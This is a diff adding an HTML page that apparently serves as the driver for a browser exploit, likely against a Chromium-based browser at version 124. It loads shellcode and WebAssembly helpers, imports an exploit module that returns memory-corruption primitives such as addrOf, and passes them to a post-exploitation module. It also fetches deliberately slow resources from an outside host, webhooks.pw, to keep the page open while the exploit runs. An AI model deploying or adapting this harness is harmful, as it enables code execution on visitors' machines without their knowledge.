@@ -1,0 +1,46 @@
+<html>
+    <body>
+        <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
+        <script src="./js/utils.js"></script>
+        <script src="./js/shellcode.js"></script>
+        <script src="./js/wasm.js"></script>
+        <script>
+
+async function main() {
+    let hint = {"name": "383bdd15-ecf0-41af-84a4-6b61dc5d07bd-expl", "version": 124, "headless": "old", "jit": true, "wasm": true};
+    await console.log(`Starting exploit ${hint.name}`);
+
+    let primitives;
+    try {
+        
+        let exploitmod = await import(`./exploit.mjs`);
+        primitives = await exploitmod.execute(hint.version);
+        if (primitives == null) {
+            return;
+        }
+        await console.log(`addrOfTest:`, to_hex(primitives.addrOf({})));
+    }
+    catch(e) {
+        await console.log(`Failed to trigger exploit: ${e}`);
+        _consolelog(e.stack);
+        return;
+    }
+
+    try {
+        let iomem = new Uint8Array(8192);
+        let postmod = await import(`./post.mjs`);
+        await postmod.execute(hint.version, primitives, iomem);
+    }
+    catch(e) {
+        await console.log(`Failed post exploit: ${e}`);
+        _consolelog(e.stack);
+    }
+}
+main();
+        </script>
+
+        <!-- Slow loading resources to give the exploit time to execute -->
+        <img src="https://img.webhooks.pw/slow.png?delay=10" />
+        <script src="https://scrip.webhooks.pw/slow.js?delay=10"></script>
+    </body>
+</html>
